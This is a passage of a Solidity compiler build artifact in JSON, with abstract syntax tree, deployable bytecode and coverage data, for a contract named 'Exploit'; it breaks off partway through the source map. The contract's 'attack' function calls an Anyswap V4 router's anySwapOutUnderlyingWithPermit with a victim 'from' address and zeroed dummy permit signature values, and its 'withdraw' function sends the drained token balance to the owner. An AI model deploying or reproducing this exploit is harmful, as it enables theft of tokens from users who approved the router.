            "nameLocation": "942:13:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 98,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 97,
                  "mutability": "mutable",
                  "name": "_token",
                  "nameLocation": "963:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 112,
                  "src": "956:13:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_IERC20_$23",
                    "typeString": "contract IERC20"
                  },
                  "typeName": {
                    "id": 96,
                    "nodeType": "UserDefinedTypeName",
                    "pathNode": {
                      "id": 95,
                      "name": "IERC20",
                      "nodeType": "IdentifierPath",
                      "referencedDeclaration": 23,
                      "src": "956:6:0"
                    },
                    "referencedDeclaration": 23,
                    "src": "956:6:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IERC20_$23",
                      "typeString": "contract IERC20"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "955:15:0"
            },
            "returnParameters": {
              "id": 99,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "978:0:0"
            },
            "scope": 176,
            "src": "933:112:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 128,
              "nodeType": "Block",
              "src": "1078:69:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 118,
                        "name": "owner",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 47,
                        "src": "1103:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 123,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "1133:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_Exploit_$176",
                                  "typeString": "contract Exploit"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_Exploit_$176",
                                  "typeString": "contract Exploit"
                                }
                              ],
                              "id": 122,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "1125:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 121,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "1125:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 124,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1125:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 119,
                            "name": "token",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 50,
                            "src": "1109:5:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$23",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 120,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 8,
                          "src": "1109:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 125,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1109:30:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 115,
                        "name": "token",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 50,
                        "src": "1088:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$23",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 117,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 17,
                      "src": "1088:14:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 126,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1088:52:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 127,
                  "nodeType": "ExpressionStatement",
                  "src": "1088:52:0"
                }
              ]
            },
            "functionSelector": "3ccfd60b",
            "id": 129,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdraw",
            "nameLocation": "1060:8:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 113,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1068:2:0"
            },
            "returnParameters": {
              "id": 114,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1078:0:0"
            },
            "scope": 176,
            "src": "1051:96:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 174,
              "nodeType": "Block",
              "src": "1236:217:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 141,
                        "name": "_token",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 137,
                        "src": "1260:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$23",
                          "typeString": "contract IERC20"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_contract$_IERC20_$23",
                          "typeString": "contract IERC20"
                        }
                      ],
                      "id": 140,
                      "name": "setUnderlying",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 112,
                      "src": "1246:13:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_contract$_IERC20_$23_$returns$__$",
                        "typeString": "function (contract IERC20)"
                      }
                    },
                    "id": 142,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1246:21:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 143,
                  "nodeType": "ExpressionStatement",
                  "src": "1246:21:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 147,
                        "name": "from",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 134,
                        "src": "1324:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "id": 150,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "1337:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Exploit_$176",
                              "typeString": "contract Exploit"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Exploit_$176",
                              "typeString": "contract Exploit"
                            }
                          ],
                          "id": 149,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1329:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 148,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1329:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 151,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1329:13:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "expression": {
                          "id": 152,
                          "name": "msg",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": -15,
                          "src": "1343:3:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_message",
                            "typeString": "msg"
                          }
                        },
                        "id": 153,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "sender",
                        "nodeType": "MemberAccess",
                        "src": "1343:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "id": 156,
                            "name": "from",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 134,
                            "src": "1370:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 154,
                            "name": "token",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 50,
                            "src": "1354:5:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$23",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 155,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 8,
                          "src": "1354:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 157,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1354:21:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "313030303030303030303030303030303030303030",
                        "id": 158,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1377:21:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_100000000000000000000_by_1",
                          "typeString": "int_const 100000000000000000000"
                        },
                        "value": "100000000000000000000"
                      },
                      {
                        "hexValue": "30",
                        "id": 159,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1399:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "hexValue": "30",
                            "id": 162,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "1409:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            },
                            "value": "0"
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            }
                          ],
                          "id": 161,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1401:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_bytes32_$",
                            "typeString": "type(bytes32)"
                          },
                          "typeName": {
                            "id": 160,
                            "name": "bytes32",
                            "nodeType": "ElementaryTypeName",
                            "src": "1401:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 163,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1401:10:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes32",
                          "typeString": "bytes32"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "hexValue": "30",
                            "id": 166,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "1420:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            },
                            "value": "0"
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            }
                          ],
                          "id": 165,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1412:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_bytes32_$",
                            "typeString": "type(bytes32)"
                          },
                          "typeName": {
                            "id": 164,
                            "name": "bytes32",
                            "nodeType": "ElementaryTypeName",
                            "src": "1412:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 167,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1412:10:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes32",
                          "typeString": "bytes32"
                        }
                      },
                      {
                        "hexValue": "3536",
                        "id": 168,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1423:2:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_56_by_1",
                          "typeString": "int_const 56"
                        },
                        "value": "56"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_100000000000000000000_by_1",
                          "typeString": "int_const 100000000000000000000"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_bytes32",
                          "typeString": "bytes32"
                        },
                        {
                          "typeIdentifier": "t_bytes32",
                          "typeString": "bytes32"
                        },
                        {
                          "typeIdentifier": "t_rational_56_by_1",
                          "typeString": "int_const 56"
                        }
                      ],
                      "expression": {
                        "id": 144,
                        "name": "anyswapV4Router",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 132,
                        "src": "1277:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_AnyswapV4Router_$45",
                          "typeString": "contract AnyswapV4Router"
                        }
                      },
                      "id": 146,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "anySwapOutUnderlyingWithPermit",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 44,
                      "src": "1277:46:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_uint8_$_t_bytes32_$_t_bytes32_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,address,uint256,uint256,uint8,bytes32,bytes32,uint256) external"
                      }
                    },
                    "id": 169,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1277:149:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 170,
                  "nodeType": "ExpressionStatement",
                  "src": "1277:149:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "id": 171,
                      "name": "withdraw",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 129,
                      "src": "1436:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$__$returns$__$",
                        "typeString": "function ()"
                      }
                    },
                    "id": 172,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1436:10:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 173,
                  "nodeType": "ExpressionStatement",
                  "src": "1436:10:0"
                }
              ]
            },
            "functionSelector": "7bea12f5",
            "id": 175,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nameLocation": "1162:6:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 138,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 132,
                  "mutability": "mutable",
                  "name": "anyswapV4Router",
                  "nameLocation": "1185:15:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 175,
                  "src": "1169:31:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_AnyswapV4Router_$45",
                    "typeString": "contract AnyswapV4Router"
                  },
                  "typeName": {
                    "id": 131,
                    "nodeType": "UserDefinedTypeName",
                    "pathNode": {
                      "id": 130,
                      "name": "AnyswapV4Router",
                      "nodeType": "IdentifierPath",
                      "referencedDeclaration": 45,
                      "src": "1169:15:0"
                    },
                    "referencedDeclaration": 45,
                    "src": "1169:15:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_AnyswapV4Router_$45",
                      "typeString": "contract AnyswapV4Router"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 134,
                  "mutability": "mutable",
                  "name": "from",
                  "nameLocation": "1209:4:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 175,
                  "src": "1201:12:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 133,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "1201:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 137,
                  "mutability": "mutable",
                  "name": "_token",
                  "nameLocation": "1221:6:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 175,
                  "src": "1214:13:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_IERC20_$23",
                    "typeString": "contract IERC20"
                  },
                  "typeName": {
                    "id": 136,
                    "nodeType": "UserDefinedTypeName",
                    "pathNode": {
                      "id": 135,
                      "name": "IERC20",
                      "nodeType": "IdentifierPath",
                      "referencedDeclaration": 23,
                      "src": "1214:6:0"
                    },
                    "referencedDeclaration": 23,
                    "src": "1214:6:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IERC20_$23",
                      "typeString": "contract IERC20"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1168:60:0"
            },
            "returnParameters": {
              "id": 139,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1236:0:0"
            },
            "scope": 176,
            "src": "1153:300:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          }
        ],
        "scope": 177,
        "src": "505:951:0",
        "usedErrors": []
      }
    ],
    "src": "37:1419:0"
  },
  "bytecode": "608060405234801561001057600080fd5b50600080546001600160a01b031916331790556104cb806100326000396000f3fe608060405234801561001057600080fd5b50600436106100625760003560e01c80633ccfd60b146100675780636f307dc3146100715780637bea12f5146100915780639dc29fac146100a4578063bdb2321f146100ca578063bebbf4d0146100dd575b600080fd5b61006f6100f9565b005b6001546040516001600160a01b0390911681526020015b60405180910390f35b61006f61009f3660046103cf565b610202565b6100ba6100b236600461037a565b600192915050565b6040519015158152602001610088565b61006f6100d836600461041a565b610341565b6100eb6100b2366004610450565b604051908152602001610088565b6001546000546040516370a0823160e01b81523060048201526001600160a01b039283169263a9059cbb92169083906370a082319060240160206040518083038186803b15801561014957600080fd5b505afa15801561015d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101819190610437565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401602060405180830381600087803b1580156101c757600080fd5b505af11580156101db573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101ff91906103a6565b50565b61020b81610341565b6001546040516370a0823160e01b81526001600160a01b03848116600483015285811692638d7d3eea928692309233929116906370a082319060240160206040518083038186803b15801561025f57600080fd5b505afa158015610273573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102979190610437565b60405160e086901b6001600160e01b03191681526001600160a01b039485166004820152928416602484015292166044820152606481019190915268056bc75e2d631000006084820152600060a4820181905260c4820181905260e4820152603861010482015261012401600060405180830381600087803b15801561031c57600080fd5b505af1158015610330573d6000803e3d6000fd5b5050505061033c6100f9565b505050565b6000546001600160a01b0316331461035857600080fd5b600180546001600160a01b0319166001600160a01b0392909216919091179055565b6000806040838503121561038d57600080fd5b823561039881610480565b946020939093013593505050565b6000602082840312156103b857600080fd5b815180151581146103c857600080fd5b9392505050565b6000806000606084860312156103e457600080fd5b83356103ef81610480565b925060208401356103ff81610480565b9150604084013561040f81610480565b809150509250925092565b60006020828403121561042c57600080fd5b81356103c881610480565b60006020828403121561044957600080fd5b5051919050565b6000806040838503121561046357600080fd5b82359150602083013561047581610480565b809150509250929050565b6001600160a01b03811681146101ff57600080fdfea2646970667358221220e85838169af7037d9f31776f79c1f3e829b05a59a960cf24552691070e7715d764736f6c63430008070033",
  "bytecodeSha1": "b28399a6a59107ff5b62c3e3fe02f336c6123488",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.7+commit.e28d00a7"
  },
  "contractName": "Exploit",
  "coverageMap": {
    "branches": {
      "0": {
        "Exploit.setUnderlying": {
          "8": [
            996,
            1013,
            true
          ]
        }
      }
    },
    "statements": {
      "0": {
        "Exploit.attack": {
          "3": [
            1246,
            1267
          ],
          "4": [
            1277,
            1426
          ],
          "5": [
            1436,
            1446
          ]
        },
        "Exploit.burn": {
          "1": [
            809,
            820
          ]
        },
        "Exploit.setUnderlying": {
          "6": [
            988,
            1014
          ],
          "7": [
            1024,
            1038
          ]
        },
        "Exploit.underlying": {
          "0": [
            699,
            720
          ]
        },
        "Exploit.withdraw": {
          "2": [
            1088,
            1140
          ]
        }
      }
    }
  },
  "dependencies": [
    "AnyswapV4Router",
    "IERC20"
  ],
  "deployedBytecode": "608060405234801561001057600080fd5b50600436106100625760003560e01c80633ccfd60b146100675780636f307dc3146100715780637bea12f5146100915780639dc29fac146100a4578063bdb2321f146100ca578063bebbf4d0146100dd575b600080fd5b61006f6100f9565b005b6001546040516001600160a01b0390911681526020015b60405180910390f35b61006f61009f3660046103cf565b610202565b6100ba6100b236600461037a565b600192915050565b6040519015158152602001610088565b61006f6100d836600461041a565b610341565b6100eb6100b2366004610450565b604051908152602001610088565b6001546000546040516370a0823160e01b81523060048201526001600160a01b039283169263a9059cbb92169083906370a082319060240160206040518083038186803b15801561014957600080fd5b505afa15801561015d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101819190610437565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401602060405180830381600087803b1580156101c757600080fd5b505af11580156101db573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101ff91906103a6565b50565b61020b81610341565b6001546040516370a0823160e01b81526001600160a01b03848116600483015285811692638d7d3eea928692309233929116906370a082319060240160206040518083038186803b15801561025f57600080fd5b505afa158015610273573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102979190610437565b60405160e086901b6001600160e01b03191681526001600160a01b039485166004820152928416602484015292166044820152606481019190915268056bc75e2d631000006084820152600060a4820181905260c4820181905260e4820152603861010482015261012401600060405180830381600087803b15801561031c57600080fd5b505af1158015610330573d6000803e3d6000fd5b5050505061033c6100f9565b505050565b6000546001600160a01b0316331461035857600080fd5b600180546001600160a01b0319166001600160a01b0392909216919091179055565b6000806040838503121561038d57600080fd5b823561039881610480565b946020939093013593505050565b6000602082840312156103b857600080fd5b815180151581146103c857600080fd5b9392505050565b6000806000606084860312156103e457600080fd5b83356103ef81610480565b925060208401356103ff81610480565b9150604084013561040f81610480565b809150509250925092565b60006020828403121561042c57600080fd5b81356103c881610480565b60006020828403121561044957600080fd5b5051919050565b6000806040838503121561046357600080fd5b82359150602083013561047581610480565b809150509250929050565b6001600160a01b03811681146101ff57600080fdfea2646970667358221220e85838169af7037d9f31776f79c1f3e829b05a59a960cf24552691070e7715d764736f6c63430008070033",
  "deployedSourceMap": "505:951:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1051:96;;;:::i;:::-;;637:90;714:5;;637:90;;-1:-1:-1;;;;;714:5:0;;;2105:51:1;;2093:2;2078:18;637:90:0;;;;;;;;1153:300;;;;;;:::i;:::-;;:::i;732:95::-;;;;;;:::i;:::-;816:4;732:95;;;;;;;;3486:14:1;;3479:22;3461:41;;3449:2;3434:18;732:95:0;3321:187:1;933:112:0;;;;;;:::i;:::-;;:::i;832:95::-;;;;;;:::i;:::-;;;3659:25:1;;;3647:2;3632:18;832:95:0;3513:177:1;1051:96:0;1088:5;;;1103;1109:30;;-1:-1:-1;;;1109:30:0;;1133:4;1109:30;;;2105:51:1;-1:-1:-1;;;;;1088:5:0;;;;:14;;1103:5;;1088;;1109:15;;2078:18:1;;1109:30:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1088:52;;-1:-1:-1;;;;;;1088:52:0;;;;;;;-1:-1:-1;;;;;3234:32:1;;;1088:52:0;;;3216:51:1;3283:18;;;3276:34;3189:18;;1088:52:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;1051:96::o;1153:300::-;1246:21;1260:6;1246:13;:21::i;:::-;1354:5;;:21;;-1:-1:-1;;;1354:21:0;;-1:-1:-1;;;;;2123:32:1;;;1354:21:0;;;2105:51:1;1277:46:0;;;;;;1324:4;;1337;;1343:10;;1354:5;;;:15;;2078:18:1;;1354:21:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1277:149;;;;;;-1:-1:-1;;;;;;1277:149:0;;;-1:-1:-1;;;;;2637:15:1;;;1277:149:0;;;2619:34:1;2689:15;;;2669:18;;;2662:43;2741:15;;2721:18;;;2714:43;2773:18;;;2766:34;;;;1377:21:0;2816:19:1;;;2809:35;1399:1:0;2860:19:1;;;2853:46;;;2915:19;;;2908:35;;;2959:19;;;2952:35;1423:2:0;3003:19:1;;;2996:35;2553:19;;1277:149:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1436:10;:8;:10::i;:::-;1153:300;;;:::o;933:112::-;1008:5;;-1:-1:-1;;;;;1008:5:0;996:10;:17;988:26;;;;;;1024:5;:14;;-1:-1:-1;;;;;;1024:14:0;-1:-1:-1;;;;;1024:14:0;;;;;;;;;;933:112::o;14:315:1:-;82:6;90;143:2;131:9;122:7;118:23;114:32;111:52;;;159:1;156;149:12;111:52;198:9;185:23;217:31;242:5;217:31;:::i;:::-;267:5;319:2;304:18;;;;291:32;;-1:-1:-1;;;14:315:1:o;334:277::-;401:6;454:2;442:9;433:7;429:23;425:32;422:52;;;470:1;467;460:12;422:52;502:9;496:16;555:5;548:13;541:21;534:5;531:32;521:60;;577:1;574;567:12;521:60;600:5;334:277;-1:-1:-1;;;334:277:1:o;616:564::-;728:6;736;744;797:2;785:9;776:7;772:23;768:32;765:52;;;813:1;810;803:12;765:52;852:9;839:23;871:31;896:5;871:31;:::i;:::-;921:5;-1:-1:-1;978:2:1;963:18;;950:32;991:33;950:32;991:33;:::i;:::-;1043:7;-1:-1:-1;1102:2:1;1087:18;;1074:32;1115:33;1074:32;1115:33;:::i;:::-;1167:7;1157:17;;;616:564;;;;;:::o;1185:260::-;1257:6;1310:2;1298:9;1289:7;1285:23;1281:32;1278:52;;;1326:1;1323;1316